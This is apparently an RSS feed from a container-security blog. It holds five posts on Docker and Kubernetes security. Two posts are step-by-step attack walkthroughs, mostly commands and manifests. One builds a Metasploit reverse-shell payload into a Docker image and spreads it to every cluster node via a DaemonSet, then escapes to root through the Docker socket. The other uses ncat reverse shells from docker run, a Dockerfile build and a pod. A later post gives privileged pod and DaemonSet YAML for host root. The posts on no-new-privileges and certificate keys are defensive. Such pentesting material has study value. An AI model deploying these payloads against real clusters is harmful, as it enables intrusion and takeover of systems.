<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title></title>
		<description>Things that occur to me</description>
		<link>/</link>
		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Making it Rain shells in Kubernetes</title>
				<description>&lt;p&gt;Following on from the &lt;a href=&quot;https://raesene.github.io/blog/2019/08/09/docker-reverse-shells/&quot;&gt;last post&lt;/a&gt; in this series lets setup a rather more ambitious set of reverse shells when attacking a Kubernetes cluster.&lt;/p&gt;

&lt;p&gt;The scenario here is that we’ve got the ability to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;daemonset&lt;/code&gt; object in a target Kubernetes cluster and we’d like to have shells on every node in the cluster which have the Docker socket exposed, so we can get a root shell on every node in the cluster.&lt;/p&gt;

&lt;p&gt;To do this we’ll need something that’ll easily handle multiple incoming shells, so we’ll turn to the &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit Framework&lt;/a&gt; and specifically, &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/multi/handler&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-1---create-the-payload&quot;&gt;Step 1 - Create the payload&lt;/h2&gt;

&lt;p&gt;We need a Docker image that we can deploy to the cluster which will have our payload to connect back to the listener that we’re going to setup and will run on each node in the cluster.&lt;/p&gt;

&lt;p&gt;For this we can run msfvenom to setup our payload and then embed that into a Docker image.&lt;/p&gt;

&lt;p&gt;In this case our pentester machine will be on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.200.1&lt;/code&gt; . To avoid managing all Metasploit’s dependencies we can just run it in a Docker container.&lt;/p&gt;

&lt;p&gt;This command will generate our payload&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.200.1 LPORT=8989 -f elf &amp;gt; reverse_shell.elf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;setting-up-the-docker-image&quot;&gt;Setting up the Docker Image&lt;/h3&gt;

&lt;p&gt;Next run this command to get the Docker GPG key into your directory&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://download.docker.com/linux/ubuntu/gpg &amp;gt; docker.gpg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now create a Dockerfile to host this shell and upload it to Docker hub.  The Dockerfile is a pretty simple one, we’ll need out payload and also the Docker client, for later use.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN apt update &amp;amp;&amp;amp; apt install -y apt-transport-https ca-certificates curl software-properties-common

COPY docker.gpg /docker.gpg

RUN apt-key add /docker.gpg

RUN add-apt-repository \
   &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \
   $(lsb_release -cs) \
   stable&quot;

RUN apt-get install -y docker-ce-cli

COPY reverse_shell.elf /reverse_shell.elf

RUN chmod +x /reverse_shell.elf

CMD [&quot;/reverse_shell.elf&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Build it with (replace raesene below with your own docker hub name)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build -t raesene/reverse_shell .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then you can login to Docker hub with &lt;code class=&quot;highlighter-rouge&quot;&gt;docker login&lt;/code&gt; and upload with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker push raesene/reverse_shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point we can test our reverse shell on a single machine by setting up a Metasploit listener and check that all is well.&lt;/p&gt;

&lt;h3 id=&quot;setting-up-metasploit-to-receive-our-shells&quot;&gt;Setting up Metasploit to receive our shells&lt;/h3&gt;

&lt;p&gt;On the pentester machine start-up the metasploit console with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfconsole
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and set our variables, in the same way we did with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; earlier&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set payload linux/x64/meterpreter_reverse_http
set LHOST 192.168.200.1
set LPORT 8989
set ExitOnSession false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With those set, we can start it up to listen for incoming shells&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exploit -j
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now on a target machine run our shell and we should get that back on the metasploit console&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/reverse_shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Assuming that’s all working we’re ready to scale it up to our Kubernetes cluster&lt;/p&gt;

&lt;h3 id=&quot;using-a-daemonset-to-compromise-a-cluster&quot;&gt;Using a Daemonset to compromise a cluster&lt;/h3&gt;

&lt;p&gt;So we want a workload which will run on every node in the cluster, and that’s exactly what a daemonset will do for us.  We’ll need a manifest that creates our daemonset and also we want it to expose the Docker socket so we can easily break out of each of our containers to the underlying host.&lt;/p&gt;

&lt;p&gt;This should work fine, unless the cluster has a PodSecurityPolicy blocking the mounting of the docker socket inside a container.&lt;/p&gt;

&lt;p&gt;We’ll call our manifest &lt;code class=&quot;highlighter-rouge&quot;&gt;reverse-shell-daemonset.yml&lt;/code&gt; and it should contain this :-&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: reverse-shell-daemonset
  labels:
spec:
  selector:
    matchLabels:
      name: reverse-shell-daemonset
  template:
    metadata:
      labels:
        name: reverse-shell-daemonset
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      containers:
      - name: revshell
        image: raesene/reverse-shell
        volumeMounts:
        - mountPath: /var/run/docker.sock
          name: dockersock
      volumes:
      - name: dockersock
        hostPath:
          path: /var/run/docker.sock
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got your manifest ready, just apply it to the cluster with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl create -f reverse-shell-daemonset.yml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Back on your metasploit console you should see your shells pop in, one for each node :)&lt;/p&gt;

&lt;h3 id=&quot;getting-to-root-on-the-nodes&quot;&gt;Getting to root on the nodes&lt;/h3&gt;

&lt;p&gt;So once you’ve got your shells working, you can interact with them from the Metasploit console&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -l 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will show you your active sessions.  Then&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -i 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will let you interact with one of them&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;should give you a shell inside the container running on one of our nodes. Now the last part is to use the exposed Docker Socket to get a root shell on the underlying host.&lt;/p&gt;

&lt;p&gt;To Do this we can juse make use of the every handy &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;Most Pointless Docker Command Ever&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Running&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and it’ll dump us out to a root shell on the underlying node :)&lt;/p&gt;
</description>
				<pubDate>Sat, 10 Aug 2019 07:10:39 +0100</pubDate>
				<link>/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</link>
				<guid isPermaLink="true">/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/</guid>
			</item>
		
			<item>
				<title>Docker and Kubernetes Reverse shells</title>
				<description>&lt;p&gt;A handy technique for any pentester is the ability to create a reverse shell. This allows for a variety of cases where you want to get access to restricted environments or want to extract information from a remote system.&lt;/p&gt;

&lt;p&gt;There’s a number of scenarios where this can apply to containerized environments, here’s a couple with the steps that could be used to setup a reverse shell using &lt;a href=&quot;https://nmap.org/ncat/&quot;&gt;ncat&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell-from-docker-run&quot;&gt;Reverse shell from docker run&lt;/h2&gt;

&lt;p&gt;Here we want to push a reverse shell back from a machine that we have &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; access to, this one is pretty simple&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
We just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;
Here we just need a Docker image that has ncat available. I’ve got one &lt;a href=&quot;https://cloud.docker.com/u/raesene/repository/docker/raesene/ncat&quot;&gt;here&lt;/a&gt; on Docker hub.&lt;/p&gt;

&lt;p&gt;So we just run this image with ncat parameters to connect back to the pentester machine on 192.168.200.1&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;reverse-shell-from-a-dockerfile&quot;&gt;Reverse Shell from a Dockerfile&lt;/h2&gt;

&lt;p&gt;So in our next scenario we’ve got the ability to get our Target Machine to do a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; on a &lt;code class=&quot;highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Here we need to construct our Dockerfile to pass into the process, this one should work based on a base ubuntu:18.04 image&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN apt update &amp;amp;&amp;amp; apt install -y nmap

RUN ncat 192.168.200.1 8989 -e /bin/sh

CMD [&quot;/bin/bash&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;when the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; command is executed, the reverse shell will pop during the build process.&lt;/p&gt;

&lt;h2 id=&quot;kubernetes-cluster&quot;&gt;Kubernetes Cluster&lt;/h2&gt;

&lt;p&gt;So say you’ve got a Kubernetes cluster where you can create pods but otherwise your rights are limited, and you’d like to get a shell inside the cluster.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Target Cluster&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into &lt;code class=&quot;highlighter-rouge&quot;&gt;/host&lt;/code&gt;, although this will fail if a restrictive &lt;code class=&quot;highlighter-rouge&quot;&gt;PodSecurityPolicy&lt;/code&gt; is in place.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
  labels:
    app: ncat
spec:
  containers:
  - name: ncat-reverse-shell
    image: raesene/ncat
    volumeMounts:
    - mountPath: /host
      name: hostvolume
    args: [&#39;192.168.200.1&#39;, &#39;8989&#39;, &#39;-e&#39;, &#39;/bin/bash&#39;]
  volumes:
  - name: hostvolume
    hostPath:
      path: /
      type: Directory
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For extra credit you could mount in the Docker socket from the underlying host and then break out relatively easily&lt;/p&gt;
</description>
				<pubDate>Fri, 09 Aug 2019 10:10:39 +0100</pubDate>
				<link>/blog/2019/08/09/docker-reverse-shells/</link>
				<guid isPermaLink="true">/blog/2019/08/09/docker-reverse-shells/</guid>
			</item>
		
			<item>
				<title>Docker Capabilities and no-new-privileges</title>
				<description>&lt;p&gt;I’ve been looking for a way to explain an demonstrate the “no-new-privileges” option in Docker for a little while for my &lt;a href=&quot;https://www.blackhat.com/us-19/training/schedule/#mastering-container-security-14020&quot;&gt;training course&lt;/a&gt; and recently came up with a way that should work, so thought it was worth a blog post.&lt;/p&gt;

&lt;h2 id=&quot;capabilities-and-docker&quot;&gt;Capabilities and Docker&lt;/h2&gt;

&lt;p&gt;First a little background.  Docker makes use of &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;capabilities&lt;/a&gt; as one of the layers of security that it applies to all new containers. Capabilities are essentially pieces of the privileges that the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user gets on a Linux system.  They enable processes to perform some privileged operations without having the full power of that user, and are very useful to get away from the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;setuid&lt;/code&gt; binaries. Docker applies a restriction that when a new container is started, even if the root user is used, it won’t get all the capabilities of root, just a subset.&lt;/p&gt;

&lt;p&gt;An important point to note is that, if your process doesn’t need any “root-like” privileges, it shouldn’t need any capabilities, and processes started by ordinary users don’t generally get granted any capabilities.&lt;/p&gt;

&lt;p&gt;For more details on Docker and capabilities there’s a post &lt;a href=&quot;https://raesene.github.io/blog/2017/08/27/Linux-capabilities-and-when-to-drop-all/&quot;&gt;here&lt;/a&gt; that goes into some more depth on the topic.&lt;/p&gt;

&lt;h2 id=&quot;no-new-privileges&quot;&gt;no-new-privileges&lt;/h2&gt;

&lt;p&gt;So where does no-new-privileges come into all this?  Well this is an option that can be passed as part of a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; statement as a security option.  The Docker documentation on it says you can use it&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;If you want to prevent your container processes from gaining additional privileges
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basically if your container runs as a non-root user (as all good containers should) this can be used to stop processes inside the container from getting additional privileges.&lt;/p&gt;

&lt;p&gt;Here’s a practical example.  Say we have a Dockerfile that looks like this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN cp /bin/bash /bin/setuidbash &amp;amp;&amp;amp; chmod 4755 /bin/setuidbash

RUN useradd -ms /bin/bash newuser

USER newuser

CMD [&quot;/bin/bash&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’ve got another bash shell which we’ve made setuid root, meaning that it can be used to get root level privileges (albeit still constrained by Docker’s default capability set).&lt;/p&gt;

&lt;p&gt;If we build this Dockerfile as &lt;code class=&quot;highlighter-rouge&quot;&gt;nonewpriv&lt;/code&gt; then run&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it nonewpriv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;we get landed into a bash shell as the &lt;code class=&quot;highlighter-rouge&quot;&gt;newuser&lt;/code&gt; user.  Running &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/setuidbash -p&lt;/code&gt; at this point will make us root demonstrating that we’ve effectively escalated our privileges inside the container.&lt;/p&gt;

&lt;p&gt;Now if we try launching the same container, but add the no-new-privileges flag&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it --security-opt=no-new-privileges:true nonewpriv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;when we run &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/setuidbash -p&lt;/code&gt; our escalation to root doesn’t work and our new bash shell stays running as the &lt;code class=&quot;highlighter-rouge&quot;&gt;newuser&lt;/code&gt; user, foiling our privilege escalation attempt :)&lt;/p&gt;

&lt;p&gt;So, this option is one worth considering if you’ve got containers being launched as a non-root user and you want to reduce the risk of malicious processes in the container trying to get additional rights.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Edit&lt;/strong&gt; Just to add based on conversations on twitter following this post, it’s worth noting that you can achieve the same effect as &lt;code class=&quot;highlighter-rouge&quot;&gt;no-new-privileges&lt;/code&gt;, if you want to run your container as a non-root user, by doing &lt;code class=&quot;highlighter-rouge&quot;&gt;cap-drop=all&lt;/code&gt; as part of the run statement.  This has a similar effect in stopping the contained processes from gaining any Linux capabilities, and if your workloads support it, is a great idea for hardening your containers.&lt;/p&gt;
</description>
				<pubDate>Sat, 01 Jun 2019 10:10:39 +0100</pubDate>
				<link>/blog/2019/06/01/docker-capabilities-and-no-new-privs/</link>
				<guid isPermaLink="true">/blog/2019/06/01/docker-capabilities-and-no-new-privs/</guid>
			</item>
		
			<item>
				<title>Certificate Authentication and the Golden Ticket at the heart of Kubernetes</title>
				<description>&lt;h2 id=&quot;authentication-in-kubernetes&quot;&gt;Authentication in Kubernetes&lt;/h2&gt;

&lt;p&gt;Authentication is an interesting area of Kubernetes security.  The built-in options for authenticating users to clusters are fairly limited. Basic Authentication and Token Authentication are generally considered to be a bad idea as they rely on cleartext credentials stored in files on disk on the API server(s) and require an API server restart when changing their contents, which is not exactly a scalable solution.&lt;/p&gt;

&lt;p&gt;This leaves client certificate authentication as the main default authentication mechanism and one that I see enabled in pretty much every cluster I look at.  Client certificate authentication also gets used for component to component authentication (e.g. to allow the Kubelet to authenticate to the API server).&lt;/p&gt;

&lt;h2 id=&quot;client-certificate-authentication&quot;&gt;Client Certificate Authentication&lt;/h2&gt;

&lt;p&gt;Client certificate authentication, however, presents it’s own set of security concerns and challenges. Securely managing the keys associated with certificate authorities can be a significant challenge, and with many clusters using 3 or more distinct CAs (before we even start talking about add-ons like istio) there’s quite a bit of scope for problems.  Kubernetes clusters will typically keep their CA certificates and keys online (i.e. they’re stored in the clear on disk on the API servers) as opposed to traditional PKI setups where a root CA key would never be held on a production system in the clear. In those more traditional setups the keys would either be stored in an HSM or kept offline and only used where needed to sign subordinate certificates.&lt;/p&gt;

&lt;h2 id=&quot;ca-keys-or-golden-tickets&quot;&gt;CA Keys or “Golden Tickets”&lt;/h2&gt;

&lt;p&gt;You can then combine that with the problem that CA keys tend to have a very long validity period (from a review of common cluster installers, 10 years is typical) and you realise that if an attacker can get access to those CA key files they can effectively have a “golden ticket” to maintain unauthorised access to the cluster for a very long time, as the CA keys can be used to create new user identities whenever they like.  This unauthorised access can happen in a number of ways, anything from a key mistakenly checked into source code control, or an attacker who can mount a volume from an API server component, could lead to leakage of a CA key.&lt;/p&gt;

&lt;p&gt;One reason these attacks are possible is due to an important (and somewhat unintuitive) aspect of Kubernetes authentication which is that in general Kubernetes has no concept of a user database, it relies on the identity provided by the authentication mechanism, to determine who the user is and then matches this to RBAC bindings to provide rights to that user.&lt;/p&gt;

&lt;p&gt;In the case of certificate authentication this is done by looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;CN&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;O&lt;/code&gt; fields of the client certificate as it’s presented to the API server.  A certificate which is signed by the appropriate CA is then given whatever rights that user identity correlates to.&lt;/p&gt;

&lt;p&gt;So an attacker with access to the CA key can just mint new user identities whenever it likes, and Kubernetes won’t complain, even if there’s another certificate with that identity.&lt;/p&gt;

&lt;h2 id=&quot;certificate-revocation-or-lack-thereof&quot;&gt;Certificate revocation (or lack thereof)&lt;/h2&gt;

&lt;p&gt;Another facet of client certificate authentication in Kubernetes which makes this problematic is that Kubernetes has no concept of certificate revocation.  So an attacker who mints a privileged client cert can continue to use this as long as the CA key doesn’t change, and as mentioned earlier, these are usually valid for 10 years.&lt;/p&gt;

&lt;p&gt;The only way to prevent this persistent access is to redeploy the entire certificate authority which, depending on the size of the cluster, could be tricky.&lt;/p&gt;

&lt;h2 id=&quot;so-how-many-clusters-could-this-affect&quot;&gt;So how many clusters could this affect?&lt;/h2&gt;

&lt;p&gt;One other facet of the way that Kubernetes is being commonly deployed which could make this an issue going forward is the number of clusters which have their API server components exposed on the Internet.  It’s relatively easy to search for Kubernetes clusters via search engines like Censys as they have common strings in their certificates.  A recent check showed that there are now over a million likely Kubernetes cluster servers on-line…&lt;/p&gt;

&lt;p&gt;It’s worth noting that these problems are more of a concern in unmanaged Kubernetes clusters, where the operator is responsible for CA management.  The main managed clusters (GKE, AKS and EKS) don’t expose the CA keys to users of the cluster and GKE also offers the option to disable client certificate authentication all together, which is good as it’s not just a problem with CA keys, user kubeconfig files with client keys can also be a risk.&lt;/p&gt;
</description>
				<pubDate>Tue, 16 Apr 2019 12:10:39 +0100</pubDate>
				<link>/blog/2019/04/16/kubernetes-certificate-auth-golden-key/</link>
				<guid isPermaLink="true">/blog/2019/04/16/kubernetes-certificate-auth-golden-key/</guid>
			</item>
		
			<item>
				<title>The most pointess Kubernetes command ever</title>
				<description>&lt;p&gt;Coming up for 4 years ago (a lifetime in Container land) Ian Miell wrote about &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;“The most pointless Docker Command Ever”&lt;/a&gt;.  This was a docker command that you could run and it would return you back as root on your host.&lt;/p&gt;

&lt;p&gt;Far from being useless, this is one of my favourite Docker commands, either to demonstrate to people why things like mounting &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.sock&lt;/code&gt; inside a container is dangerous, or for using as part of security tests where I can create containers, and I’d like to get to the underlying host easily.&lt;/p&gt;

&lt;p&gt;I was thinking today, I wonder what this would look like in Kubernetes…? So I create a quick pod YAML file to test.  You can use this YAML to demonstrate the risks of allowing users to create pods on your cluster, without PodSecurityPolicy setup (of course, I’m sure &lt;strong&gt;all&lt;/strong&gt; production clusters have a PodSecurityPolicy….. right?).&lt;/p&gt;

&lt;p&gt;The YAML is pretty simple, it basically creates a privileged container based on the &lt;code class=&quot;highlighter-rouge&quot;&gt;busybox&lt;/code&gt; image and sets it in an endless loop, waiting for a connection, whilst also setting up the appropriate security flags to make the pod privileged, and also mounting the root directory of the underlying host into &lt;code class=&quot;highlighter-rouge&quot;&gt;/host&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ]
    args: [ &quot;while true; do sleep 30; done;&quot; ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got that as a file called say “noderoot.yml” , just run &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl create -f noderoot.yml&lt;/code&gt;
then, to get root on your Kubernetes node you just need to run&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl exec -it noderootpod chroot /host&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and Hey Presto, you’ll be the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user on the host :)&lt;/p&gt;

&lt;p&gt;Of course, you’re thinking, “that only does one random node” and you’d be right.  To get root shells on all the nodes, what you need is a DaemonSet, which will schedule a Pod onto every node in the cluster.&lt;/p&gt;

&lt;p&gt;The YAML for this is a little more complex, but the essence is the same&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: noderootpod
  labels:
spec:
  selector:
    matchLabels:
      name: noderootdaemon
  template:
    metadata:
      labels:
        name: noderootdaemon
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: noderootpod
        image: busybox
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ]
        args: [ &quot;while true; do sleep 30; done;&quot; ]
      volumes:
      - name: noderoot
        hostPath:
          path: /
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once that’s run just do a &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl get po&lt;/code&gt; to see your list of pods to choose from, and run the same &lt;code class=&quot;highlighter-rouge&quot;&gt;chroot /host&lt;/code&gt; command on one to get that root on the host feeling…&lt;/p&gt;

